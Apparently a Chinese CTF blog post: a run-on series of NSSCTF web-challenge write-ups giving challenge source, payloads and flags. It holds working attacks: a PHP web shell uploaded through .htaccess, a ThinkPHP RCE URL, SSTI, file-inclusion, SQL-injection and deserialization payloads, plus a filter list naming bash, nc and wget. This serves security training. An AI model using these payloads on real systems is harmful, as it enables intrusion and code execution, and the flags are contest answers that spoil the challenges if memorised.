2023]作业管理系统弱口令admin&#x2F;admin登录成功,有个上传文件的地点上传1.php,蚁剑链接即可\n\nNSSCTF&#123;87d35619-3607-475a-b784-5de88f37f2d8&#125;\n\n[SWPUCTF 2021 ]pop&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123;    private $admin = &#x27;aaa&#x27;;    protected $passwd = &#x27;123456&#x27;;    public function Getflag()&#123;        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;else&#123;            echo $this-&gt;admin;            echo $this-&gt;passwd;            echo &#x27;nono&#x27;;        &#125;    &#125;&#125;class w22m&#123;    public $w00m;    public function __destruct()&#123;        echo $this-&gt;w00m;    &#125;&#125;class w33m&#123;    public $w00m;    public $w22m;    public function __toString()&#123;        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();        return 0;    &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);\n\nw22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()\n\n&lt;?phpclass w44m&#123;    private $admin = &#x27;w44m&#x27;;    protected $passwd = &#x27;08067&#x27;;&#125;class w22m&#123;    public $w00m;&#125;class w33m&#123;    public $w00m;    public $w22m;&#125;# w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()$a = new w22m();echo urlencode(serialize($a));?&gt;\n\n\nNSSCTF&#123;fb43f7ba-ac7b-4398-ac41-78c0c4b91e55&#125;\n\n[鹏城杯 2022]简单包含&lt;?phphighlight_file(__FILE__);include($_POST[&quot;flag&quot;]);//flag in /var/www/html/flag.php;?&gt;\n\n文件包含,但是有waf,添加脏数据即可绕过\n1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php\n\n得到的字符串base64解码即可\n\nNSSCTF&#123;898bdef2-4464-46c4-a33d-16f3ec2fb907&#125;\n\n[SWPUCTF 2021 ]finalrce&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url=$_GET[&#x27;url&#x27;];    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url))    &#123;        echo &quot;Sorry,you can&#x27;t use this.&quot;;    &#125;    else    &#123;        echo &quot;Can you see anything?&quot;;        exec($url);    &#125;&#125;\n\n无回显rce,dns外带,反弹shell都不行,但是没有过滤tee命令,ls被过滤,用l’’s即可绕过\n?url=l&#x27;&#x27;s /|tee 1.txt 访问1.txt即可\n\n\n不知道哪个是真的,都试试\n?url=tac /a_here_is_a_f1ag|tee 2.txt\n\n\n?url=tac /flllllaaaaaaggggggg|tee 3.txt\n\n发现la被过滤,也用l’’a过滤即可\n?url=tac /flllll&#x27;&#x27;aaaaaaggggggg|tee 3.txt\n\n\nNSSCTF&#123;dce5fd0e-5c6f-4cf5-bee1-a7e92a9a2f39&#125;\n\n[SWPUCTF 2021 ]sql\nfuzz一下,过滤了空格和等号,空格用&#x2F;**&#x2F;,等号用like,sqlmap一把梭\npython sqlmap.py -u http://node4.anna.nssctf.cn:28905/?wllm=1 --tamper=space2comment,equaltolike --batch --tablesNSSCTF&#123;c102c917-6b0c-46f0-9b5f-85cb84c46e86&#125;\n\n[HNCTF 2022 Week1]Interesting_includehttp://node5.anna.nssctf.cn:23362/?filter=php://filter/read=convert.base64-encode/resource=flag.php\n\n\nNSSCTF&#123;fd4469d9-cb38-4626-be18-66249511c7eb&#125;\n\n[NSSCTF 2022 Spring Recruit]babyphp&lt;?phphighlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;                echo $flag;            &#125;else&#123;                echo &quot;yee&quot;;            &#125;        &#125;else&#123;            echo &quot;nop&quot;;        &#125;    &#125;else&#123;        echo &quot;go on&quot;;    &#125;&#125;else&#123;    echo &quot;let&#x27;s get some php&quot;;&#125;?&gt;\n\nintval不能转换数组,会返回1或者0,具体看数组是否为空a[]=1&amp;b1[]=1&amp;b2[]=2&amp;c1=240610708&amp;c2=QNKCDZO\n\n\nNSSCTF&#123;5fc91657-8e8c-4dbd-b42e-897518cdcdb6&#125;\n\n[LitCTF 2023]Vim yyds\n打开swp文件\nvim -r index.php.swp\n\n&lt;?phperror_reporting(0);$password = &quot;Give_Me_Your_Flag&quot;;echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;if ($_POST[&#x27;password&#x27;] == base64_encode($password)) &#123;    echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;    eval(system($_POST[&#x27;cmd&#x27;])&#125;?&gt;\n\n\nNSSCTF&#123;cffb4191-06eb-419c-8b2d-6c9dd0e7f7ed&#125;\n\n[鹤城杯 2021]EasyP&lt;?phpinclude &#x27;utils.php&#x27;;if (isset($_POST[&#x27;guess&#x27;])) &#123;    $guess = (string) $_POST[&#x27;guess&#x27;];    if ($guess === $secret) &#123;        $message = &#x27;Congratulations! The flag is: &#x27; . $flag;    &#125; else &#123;        $message = &#x27;Wrong. Try Again&#x27;;    &#125;&#125;if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;    exit(&quot;hacker :)&quot;);&#125;if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;    exit(&quot;hacker :)&quot;);&#125;if (isset($_GET[&#x27;show_source&#x27;])) &#123;    highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));    exit();&#125;else&#123;    show_source(__FILE__);&#125;?&gt; \n\n案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root$_SERVER[&#x27;PHP_SELF&#x27;] \t得到：/php/index.php/test/foo$_SERVER[&#x27;REQUEST_URI&#x27;] 得到：/php/index.php/test/foo?username=root\n\n/index.php/utils.php/%a0?show+source=1%a0 是 URL 编码中的一个特殊字符，代表一个非打印字符（No-Break Space）。在 PHP 中，非打印字符通常会被忽略。所以，/utils.php/%a0 实际上被 PHP 解析为 /utils.php/show_source绕过:用+绕过,因为变量名有+会被替换为_\n\n\nNSSCTF&#123;692b6db9-26ae-4800-89a2-e0df6bf675f0&#125;\n\n[SWPUCTF 2022 ]ez_ez_php(revenge)&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;        echo &quot;Nice!!!&quot;;        include($_GET[&quot;file&quot;]);    &#125;     else &#123;        echo &quot;Hacker!!&quot;;    &#125;&#125;else &#123;    highlight_file(__FILE__);&#125;\n\n?file=php://filter/read=convert.base64-encode/resource=flag.php\n\n&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);echo   &quot;NSSCTF&#123;flag_is_not_here&#125;&quot; .&quot;&lt;br/&gt;&quot;;echo &quot;real_flag_is_in_ &#x27;/flag&#x27; &quot;.&quot;&lt;br/&gt;&quot;;echo &quot;换个思路，试试PHP伪协议呢&quot;;\n\n?file=php://filter/read=convert.base64-encode/resource=/flag\n\n\nNSSCTF&#123;314f54d0-a0be-4756-a49b-3ae5c1ce851c&#125;\n\n[HUBUCTF 2022 ]checkin&lt;?phpshow_source(__FILE__);$username  = &quot;this_is_secret&quot;; $password  = &quot;this_is_not_known_to_you&quot;; include(&quot;flag.php&quot;);//here I changed those two $info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($info);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;    echo $flag;&#125;else&#123;    echo &quot;username or password error!&quot;;&#125;?&gt;\n\n弱比较即可,true和什么比较都是真的\n?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;\n\n\nNSSCTF&#123;57defded-2363-4440-b19e-e78ea1b25589&#125;\n\n[CISCN 2019华东南]Web11\nsmarty的ssti,改xff即可\n\n\n&#123;&#123;system(&#x27;tac /f*&#x27;)&#125;&#125;\n\nflag在f12里才能看得到\n\nNSSCTF&#123;41a64a71-607f-4160-99ee-56cdbbcb7dba&#125;\n\n[GDOUCTF 2023]EZ WEBctrl+u得到提示&#x2F;src\nimport flaskapp = flask.Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index():  return flask.send_file(&#x27;index.html&#x27;)@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])def source():  return flask.send_file(&#x27;app.py&#x27;)@app.route(&#x27;/super-secret-route-nobody-will-guess&#x27;, methods=[&#x27;PUT&#x27;])def flag():  return open(&#x27;flag&#x27;).read()\n\n用PUT方法访问&#x2F;super-secret-route-nobody-will-guess\n\nNSSCTF&#123;8da126ae-6484-4e9e-a89a-9346d6e25c2b&#125;\n\n[GDOUCTF 2023]泄露的伪装dirsearch扫描到test.txt和www.rar\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;cxk&#x27;]))&#123;    $cxk=$_GET[&#x27;cxk&#x27;];    if(file_get_contents($cxk)==&quot;ctrl&quot;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;娲楁礂鐫″惂&quot;;    &#125;&#125;else&#123;    echo &quot;nononoononoonono&quot;;&#125;?&gt;\n\nwww.rar:\n恭喜你turn to/orzorz.php\n\n\nNSSCTF&#123;5dd848cd-187f-406f-bfd9-0b67a13c39da&#125;\n\n[UUCTF 2022 ]ez_rceif(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if (!preg_match(&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;,$code))&#123;        echo &#x27;看看你输入的参数！！！不叫样子！！&#x27;;echo &#x27;&lt;br&gt;&#x27;;        eval($code);    &#125;    else&#123;        die(&quot;你想干什么？？？？？？？？？&quot;);    &#125;&#125;else&#123;    echo &quot;居然都不输入参数，可恶!!!!!!!!!&quot;;    show_source(__FILE__);&#125;\n\n没过滤反引号,还需要有个回显函数,print_r\n?code=print_r(`l\\s /`);bin boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var?code=print(`c\\at%09/fffffffffflagafag`);NSSCTF&#123;This_IS_s0_easy_RCE&#125;\n\n\n[LitCTF 2023]这是什么？SQL ！注一下 ！$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.&#x27;((((((&#x27;.$_GET[&quot;id&quot;].&#x27;))))))&#x27;;$result = $conn-&gt;query($sql);\n\n六个括号\n库:?id=-1)))))) union select schema_name,2 from information_schema.schemata--+Array ( [0] =&gt; Array ( [username] =&gt; information_schema [password] =&gt; 2 ) [1] =&gt; Array ( [username] =&gt; mysql [password] =&gt; 2 ) [2] =&gt; Array ( [username] =&gt; ctftraining [password] =&gt; 2 ) [3] =&gt; Array ( [username] =&gt; performance_schema [password] =&gt; 2 ) [4] =&gt; Array ( [username] =&gt; test [password] =&gt; 2 ) [5] =&gt; Array ( [username] =&gt; ctf [password] =&gt; 2 ) )猜测是ctftraining库?id=-1)))))) union select table_name,2 from information_schema.tables where table_schema=&#x27;ctftraining&#x27;--+Array ( [0] =&gt; Array ( [username] =&gt; flag [password] =&gt; 2 ) [1] =&gt; Array ( [username] =&gt; news [password] =&gt; 2 ) [2] =&gt; Array ( [username] =&gt; users [password] =&gt; 2 ) )查字段:?id=-1)))))) union select flag,2 from ctftraining.flag--+\n\n\nNSSCTF&#123;60b9f165-1f1d-43af-8074-2d33cad25413&#125; \n\n[HNCTF 2022 Week1]2048findsomething找到有2048.js\n\n把alert那一串放到控制台即可\n\nflag&#123;53160c888e25c3f828b23e316a7ae083&#125;\n\n[SWPUCTF 2022 ]1z_unserialize&lt;?php class lyh&#123;    public $url = &#x27;NSSCTF.com&#x27;;    public $lt;    public $lly;          function  __destruct()     &#123;        $a = $this-&gt;lt;        $a($this-&gt;lly);     &#125;        &#125;unserialize($_POST[&#x27;nss&#x27;]);highlight_file(__FILE__);\n\n&lt;?phpclass lyh&#123;    public $url = &#x27;NSSCTF.com&#x27;;    public $lt = &#x27;system&#x27;;    public $lly=&#x27;ls /&#x27;;          function  __destruct()     &#123;        $a = $this-&gt;lt;        $a($this-&gt;lly);     &#125;&#125;$a = new lyh();echo urlencode(serialize($a));?&gt;O%3A3%3A%22lyh%22%3A3%3A%7Bs%3A3%3A%22url%22%3Bs%3A10%3A%22NSSCTF.com%22%3Bs%3A2%3A%22lt%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22lly%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n\n\n\nNSSCTF&#123;943c6300-969a-4972-b9e5-bca0ffb94bfb&#125; \n\n[SWPUCTF 2022 ]奇妙的MD5抓包,头部有提示\n\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\n用万能密码ffifdyop绕过\n第二关\n$x= $GET[&#x27;x&#x27;];$y = $_GET[&#x27;y&#x27;];if($x != $y &amp;&amp; md5($x) == md5($y))&#123;;\n\n?x=QNKCDZO&amp;y=240610708\n\n第三关\n&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123;    echo $FLAG;&#125;\n\nphp的md5函数不能处理数组,会返回false\nwqh[]=1&amp;dsy[]=2\n\n\nNSSCTF&#123;4c6ee843-f49a-44b5-9f96-7a6222519aea&#125;\n\n[SWPUCTF 2022 ]ez_ez_unserialize&lt;?phpclass X&#123;    public $x = __FILE__;    function __construct($x)    &#123;        $this-&gt;x = $x;    &#125;    function __wakeup()    &#123;        if ($this-&gt;x !== __FILE__) &#123;            $this-&gt;x = __FILE__;        &#125;    &#125;    function __destruct()    &#123;        highlight_file($this-&gt;x);        //flag is in fllllllag.php    &#125;&#125;if (isset($_REQUEST[&#x27;x&#x27;])) &#123;    @unserialize($_REQUEST[&#x27;x&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n绕过__wakeup只要改一下序列化字符串中对象属性的个数即可(PHP&#x2F;5.5.38)\n&lt;?phpclass X&#123;    public $x = &#x27;fllllllag.php&#x27;;    function __construct($x)    &#123;        $this-&gt;x = $x;    &#125;    function __wakeup()    &#123;        if ($this-&gt;x !== __FILE__) &#123;            $this-&gt;x = __FILE__;        &#125;    &#125;    function __destruct()    &#123;        highlight_file($this-&gt;x);        //flag is in fllllllag.php    &#125;&#125;echo serialize(new X(&#x27;fllllllag.php&#x27;));O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;//payload\n\n\nNSSCTF&#123;0b3111b4-8e75-4772-8d53-01b939ae699b&#125;\n\n[GKCTF 2020]cve版签到点开按钮,抓包\n\nflag in localhost,ssrf,%00截断字符串\n?url=127.0.0.1%00.ctfhub.com\n\n\n?url=http://127.0.0.123%00www.ctfhub.com\n\n\nNSSCTF&#123;cc6dc12c-070b-4bfd-b475-ab40e6b1de81&#125;\n\n[羊城杯 2020]easycon\n\ncat 这个文件,把回显的baase64字符串转为图片\n\n\nNSSCTF&#123;do_U_kn0W_c@idao&#125;\n\n[MoeCTF 2022]baby_file&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n?file=php://filter/read=convert.base64-encode/resource=flag.phpNSSCTF&#123;0790ba2e-76a6-4722-bb29-bcbdebc2e264&#125;\n\n[HNCTF 2022 Week1]easy_htmlcookie中提示flag在.%2Ff14g.php,访问,抓包,输入长一点的数字即可\n\nNSSCTF&#123;03aa8e85-b49a-4017-9663-f64df90b5991&#125;\n\n[GDOUCTF 2023]受不了一点&lt;?phperror_reporting(0);header(&quot;Content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&#x27;gdou&#x27;])&amp;&amp;isset($_POST[&#x27;ctf&#x27;]))&#123;    $b=$_POST[&#x27;ctf&#x27;];    $a=$_POST[&#x27;gdou&#x27;];    if($_POST[&#x27;gdou&#x27;]!=$_POST[&#x27;ctf&#x27;] &amp;&amp; md5($a)===md5($b))&#123;        if(isset($_COOKIE[&#x27;cookie&#x27;]))&#123;           if ($_COOKIE[&#x27;cookie&#x27;]==&#x27;j0k3r&#x27;)&#123;               if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; isset($_GET[&#x27;bbb&#x27;]))&#123;                  $aaa=$_GET[&#x27;aaa&#x27;];                  $bbb=$_GET[&#x27;bbb&#x27;];                 if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123;                   $give = &#x27;cancanwordflag&#x27;;                   $get =&#x27;hacker!&#x27;;                   if(isset($_GET[&#x27;flag&#x27;]) &amp;&amp; isset($_POST[&#x27;flag&#x27;]))&#123;                         die($give);                    &#125;                   if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;                       die($get);                    &#125;                    foreach ($_POST as $key =&gt; $value) &#123;                        $$key = $value;                   &#125;                    foreach ($_GET as $key =&gt; $value) &#123;                         $$key = $$value;                    &#125;                   echo $flag;            &#125;else&#123;                  echo &quot;洗洗睡吧&quot;;                 &#125;    &#125;else&#123;        echo &quot;行不行啊细狗&quot;;        &#125;  &#125;&#125;?&gt;\n\n\nNSSCTF&#123;629b2eb2-d6d9-459e-b8fb-c066b6f6defe&#125;\n\n[HCTF 2018]Warmup&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt;hint.php:flag is in ffffllllaaaagggg\n\n有个in_array函数,传进来的需要有白名单里的字符串\n$_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );mb_strpos函数:  查找字符串在另一个字符串中首次出现的位置 mb_strpos ($haystack , $needle , $offset )$haystack：被搜索的字符串$needle：  要查找的字符串$offset：  可选参数,指定从哪个字符开始搜索//如果为正数,则从字符串的开头开始计算;如果是负数,则从字符串的末尾开始计算//没有的话默认是0,即从开头开始搜索 mb_substr函数:  从一个字符串中提取子字符串 mb_substr ($str , $start , $length )//substr() 函数只针对英文字符,而mb_substr()对于中文也适用$str：    原始字符串$start：  起始位置,如果为正数,则从字符串的开头开始计算;如果是负数,则从字符串的末尾开始计算$length： 可选参数,表示要提取的子字符串的长度,如果没赋值,则提取从开始到字符串结束的所有字符        首先使用mb_strpos函数找到$page中第一个问号的位置,然后使用mb_substr函数将问号之前的部分赋值作为$_page进行处理经过mb_strpos和mb_substr函数得到的$_page如果在白名单中,返回true,所以传的东西一定要包含?且问号之前的字符串一定得是白名单里的字符串\n\n\nNSSCTF&#123;bce812f5-84d0-4b36-bbe1-62dfe79ec0d5&#125;\n\n[HNCTF 2022 Week1]What is Web\nNSSCTF&#123;Hell0_Weber_Wec0m3_come_2_web_w0r1d!&#125;\n\n这题也配20金币?\n[HNCTF 2022 Week1]Interesting_httpPOST / HTTP/1.1Host: node5.anna.nssctf.cn:20139Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 9Cookie: user=adminx-forwarded-for:127.0.0.1want=flag\n\n\nNSSCTF&#123;5dfb4e40-3a07-4c95-8ef7-fad0817e6d6f&#125;\n\n[SWPUCTF 2022 ]where_am_i\n搜酒店号码,02886112888\n\nNSSCTF&#123;768c51d0-ab7f-441b-81c2-8d51bf5bbd55&#125;\n\n[SWPUCTF 2022 ]ez_rcethinkphp5.0.22 rce payload:\nhttp://node7.anna.nssctf.cn:26494/NSS/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls / \n\n\n找flag位置,不在&#x2F;flag\nfind / -type f -exec grep -l &quot;NSSCTF&quot; &#123;&#125; \\;\n\n在&#x2F;nss&#x2F;ctf&#x2F;flag&#x2F;flag\n\nNSSCTF&#123;26719f97-fff1-4d12-80db-cc40a6ab7d62&#125;\n\n[GXYCTF 2019]BabyUpload上传.htaccess,改mime为image&#x2F;jpeg,然后传马\nGIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[1]);&lt;/script&gt;\n\n\nNSSCTF&#123;dc37e82d-43c6-469a-98cb-8b2919966102&#125;\n\n[SWPUCTF 2022 ]xff[HNCTF 2022 Week1]easy_upload传马,改mime\n\nNSSCTF&#123;d8f3b55b-0443-40bf-bc9b-9bbfc6be208b&#125;\n\n[HNCTF 2022 WEEK2]ez_SSTI参数是name\n利用字符串类-&gt;基类-&gt;所有python子类-&gt;get_data方法读取flag\n?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[118][&quot;get_data&quot;](0,&quot;flag&quot;)&#125;&#125;.\n\n\nNSSCTF&#123;78ca93c4-c65d-4030-8557-6f56fe5fcd91&#125;\n\n[SWPUCTF 2022 ]js_signfindsomething得到存在main.js文件,访问\ndocument.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123;    flag=&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;    if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123;        alert(&quot;you got hint!!!&quot;);    &#125; else &#123;        alert(&quot;fuck off !!&quot;);    &#125;    &#125;)dGFwY29kZQ==  即tap code把flag用tapcode变换得到flag\n\n\nNSSCTF&#123;youfindflagbytapcode&#125;\n\n[强网杯 2019]随便注?inject=1&#x27;;show+tables;%23   words 191981093114514?inject=1&#x27;;show+columns+from+words;%23?inject=1&#x27;;show+columns+from+`1919810931114514`;%23\n\n\n\n通过观察 words表单有两列, 也就是上面的 1 和 hahahah我们可以推测 这个表单其实是从words表中以id字段为索引获取到内容 然后返回到前台并且后台的查询语句为&quot;select * from words where id=&#39;&quot;.$_GET[&#39;inject&#39;].&quot;&#39;&quot;\n那么 我们是不是可以通过修改带flag字段的表的名字为words表 然后把flag 字段修改为id通过三条alter语句来修改\n\n修改words表名为其他的\nalter table words rename words1;\n\n\n修改1919810931114514表名为words\nalter table 1919810931114514 rename words;\n\n\n修改新的words表中的flag列名为id\nalter table words change flag id varchar(60);得到最终payload 1&#39;;alter table words rename words1;alter table 1919810931114514 rename words;alter table words change flag id varchar(60);#\n\n\n\n发现没结果了, 原因是新的id列中的值已经变为flag值了 所以查询inject&#x3D;1查不到我们可以通过让where条件永远为正查出来所有数据构造payload1&#39; or &#39;1&#39;=&#39;1获取到flag值\n\nNSSCTF&#123;9c8b2625-1334-448a-86d1-f9a26c72ccb7&#125;\n\n[HDCTF 2023]SearchMasterdirsearch扫描到composer.json文件\n\n&#123;    &quot;name&quot;: &quot;smarty/smarty&quot;,    &quot;type&quot;: &quot;library&quot;,    &quot;description&quot;: &quot;Smarty - the compiling PHP template engine&quot;,    &quot;keywords&quot;: [        &quot;templating&quot;    ],    &quot;homepage&quot;: &quot;https://smarty-php.github.io/smarty/&quot;,    &quot;license&quot;: &quot;LGPL-3.0&quot;,    &quot;authors&quot;: [        &#123;            &quot;name&quot;: &quot;Monte Ohrt&quot;,            &quot;email&quot;: &quot;monte@ohrt.com&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Uwe Tews&quot;,            &quot;email&quot;: &quot;uwe.tews@googlemail.com&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Rodney Rehm&quot;,            &quot;email&quot;: &quot;rodney.rehm@medialize.de&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Simon Wisselink&quot;,            &quot;homepage&quot;: &quot;https://www.iwink.nl/&quot;        &#125;    